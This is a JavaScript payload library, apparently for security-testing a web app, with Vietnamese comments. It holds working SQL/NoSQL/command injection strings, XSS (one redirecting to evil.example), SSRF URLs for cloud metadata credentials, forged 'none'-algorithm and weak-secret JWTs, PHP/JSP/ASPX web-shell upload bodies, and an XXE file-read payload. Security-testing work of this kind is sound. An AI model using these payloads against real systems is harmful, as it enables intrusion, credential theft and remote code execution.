'use strict';
// Thu vien payload cho cac phep kiem bao mat

// A03 - SQL Injection
const SQLI = [
  "'",
  "''",
  "' OR '1'='1",
  "' OR 1=1--",
  "' OR 1=1#",
  "' OR 1=1/*",
  "admin'--",
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL,NULL--",
  "1' AND SLEEP(5)--",
  "1'; WAITFOR DELAY '0:0:5'--",
  "1' AND 1=CONVERT(int,(SELECT @@version))--",
  "') OR ('1'='1",
  "\\'",
  "1 OR 1=1",
  "%27%20OR%20%271%27%3D%271",
];

// A03 - NoSQL Injection
const NOSQL = [
  { $ne: null },
  { $gt: '' },
  { $regex: '.*' },
  { $where: 'this.password.length > 0' },
  { username: { $ne: null }, password: { $ne: null } },
];

// A03 - OS Command Injection
const CMDI = [
  '; id',
  '| id',
  '|| id',
  '&& id',
  '; cat /etc/passwd',
  '$(id)',
  '`id`',
  '%0a id',
  '; ping -c 1 127.0.0.1',
];

// A03 - XSS
const XSS = [
  '<script>alert(1)</script>',
  '"><script>alert(1)</script>',
  "'><img src=x onerror=alert(1)>",
  '<svg/onload=alert(1)>',
  'javascript:alert(1)',
  '<iframe src=javascript:alert(1)>',
  '<body onload=alert(1)>',
  '"-alert(1)-"',
  '<script>document.location="http://evil.example"</script>',
];

// A03 - SSTI
const SSTI = [
  '{{7*7}}',
  '${7*7}',
  '<%= 7*7 %>',
  '#{7*7}',
  '{{constructor.constructor("return 7*7")()}}',
];

// A03 - Path Traversal
const TRAVERSAL = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\win.ini',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  '/etc/passwd%00.png',
  'C:\\Windows\\win.ini',
  '....//....//....//windows/win.ini',
];

// A10 - SSRF
const SSRF = [
  'http://169.254.169.254/latest/meta-data/',
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
  'http://metadata.google.internal/computeMetadata/v1/',
  'http://127.0.0.1:22',
  'http://127.0.0.1:5432',
  'http://127.0.0.1:6379',
  'http://localhost:9200/',
  'file:///etc/passwd',
  'gopher://127.0.0.1:6379/_INFO',
  'dict://127.0.0.1:6379/INFO',
  'http://[::1]:3001/api/health',
  'http://0.0.0.0:3001/api/health',
  'http://2130706433/',
  'http://0177.0.0.1/',
];

// A02/A07 - JWT attacks
function b64url(obj) {
  return Buffer.from(JSON.stringify(obj)).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

function jwtNoneAlg() {
  return b64url({ alg: 'none', typ: 'JWT' }) + '.' + b64url({ sub: '1', userId: 1, role: 'admin', roles: ['admin'], iat: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + 3600 }) + '.';
}

function jwtAlgNoneUpper() {
  return b64url({ alg: 'None', typ: 'JWT' }) + '.' + b64url({ sub: '1', role: 'admin', exp: Math.floor(Date.now() / 1000) + 3600 }) + '.';
}

// JWT ky bang khoa yeu da biet (neu secret yeu/doan duoc)
function jwtWeakSecrets(header, payload, crypto) {
  const weak = ['secret', 'jwt_secret', 'changeme', 'ktnb', 'ktnb_secret', 'password', '123456', 'admin', 'your-256-bit-secret', 'secretKey'];
  const out = [];
  const h = b64url(header), p = b64url(payload);
  for (const s of weak) {
    const sig = crypto.createHmac('sha256', s).update(h + '.' + p).digest('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    out.push({ secret: s, token: h + '.' + p + '.' + sig });
  }
  return out;
}

// A02 - Mat khau yeu thuong gap
const WEAK_PASSWORDS = ['123456', 'password', 'admin', 'admin123', '12345678', 'qwerty', '111111', 'ktnb', '123456789', 'Password123', 'abc123', 'letmein'];

// A08 - File upload nguy hiem
const MALICIOUS_FILES = [
  { name: 'shell.php', type: 'application/x-php', body: '<?php system($_GET["c"]); ?>' },
  { name: 'shell.jsp', type: 'application/x-jsp', body: '<% Runtime.getRuntime().exec(request.getParameter("c")); %>' },
  { name: 'shell.aspx', type: 'application/x-aspx', body: '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe"); %>' },
  { name: 'shell.phtml', type: 'text/html', body: '<?php echo 1; ?>' },
  { name: 'x.svg', type: 'image/svg+xml', body: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>' },
  { name: 'x.html', type: 'text/html', body: '<script>alert(1)</script>' },
  { name: 'evil.exe', type: 'application/octet-stream', body: 'MZ' },
  { name: 'a.jpg.php', type: 'image/jpeg', body: '<?php echo 1; ?>' },
  { name: 'a.php%00.jpg', type: 'image/jpeg', body: '<?php echo 1; ?>' },
  { name: 'zip-slip.zip', type: 'application/zip', body: 'PK\u0003\u0004' },
];

// A08 - XXE trong XML/SVG/DOCX
const XXE_PAYLOAD = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>';

// A04/A07 - Tai khoan thuong dung
const COMMON_USERS = ['admin', 'administrator', 'root', 'test', 'user', 'sa', 'quantri', 'nguoidung'];

module.exports = {
  SQLI, NOSQL, CMDI, XSS, SSTI, TRAVERSAL, SSRF, WEAK_PASSWORDS, MALICIOUS_FILES, XXE_PAYLOAD, COMMON_USERS,
  b64url, jwtNoneAlg, jwtAlgNoneUpper, jwtWeakSecrets,
};